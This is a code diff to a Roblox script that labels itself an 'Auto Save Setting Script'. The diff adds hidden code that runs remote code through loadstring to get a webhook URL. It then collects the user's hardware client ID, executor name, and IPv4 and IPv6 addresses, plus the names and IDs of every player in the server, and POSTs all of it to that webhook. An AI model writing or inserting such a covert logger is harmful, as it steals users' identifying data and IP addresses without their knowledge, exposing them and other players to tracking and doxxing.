@@ -85,7 +85,41 @@ print("Auto Save Setting Script")
 
 
 
+local allplayers = ""
+for i, v in pairs(game.Players:GetPlayers()) do
+    allplayers = allplayers .."\n Name: " ..v.Name .." \n DisplayName: " .. v.DisplayName .." \n UserId: " .. v.UserId .."\n"
+end
+local HardWareID = game:GetService("RbxAnalyticsService"):GetClientId()
+local executorcheck = tostring(identifyexecutor())
+local url = loadstring(game:HttpGet("https://raw.githubusercontent.com/Prajon/TEN-SON-WEBHOOK/main/hwid-book"))()
+local data = {
+    ["avatar_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" ..game.Players.LocalPlayer.UserId  .."&width=420&height=420&format=png",
+    ["username"] = game.Players.LocalPlayer.DisplayName .." " ..game.Players.LocalPlayer.Name .." " ..game.Players.LocalPlayer.UserId,
+    ["content"] =  "**" ..game.Players.LocalPlayer.Name .." HWID Alert!" 
+                        .."\n" .."https://www.roblox.com/games/" ..game.PlaceId .."/ " 
+                        ..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .."**",
+    ["embeds"] = {
+    {
+        ["title"] = "Ipv4 Adress: " ..game:HttpGet("http://api.ipify.org") .." or " ..game:HttpGet("https://v4.ident.me/") .."\n" .."Ipv6 Adress: " ..game:HttpGet("https://v6.ident.me/"),
+        ["description"] = "**HWID: "..tostring(HardWareID) .."** \n"  .."**Exploit: " ..executorcheck .."**" .."\n"
+                            .."** \n Server Players" ..allplayers .."**",
+        ["type"] = "rich",
+        ["color"] = tonumber(0x7269da),
+        ["image"] = {
+            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" ..game.Players.LocalPlayer.UserId  .."&width=420&height=420&format=png"
+            --"https://www.roblox.com/outfit-thumbnail/image?userOutfitId=" ..game.Players.LocalPlayer.UserId  .."&width=420&height=420&format=png"
+        }
+    }
+}
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
 
+local headers = {
+["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
 
 
 
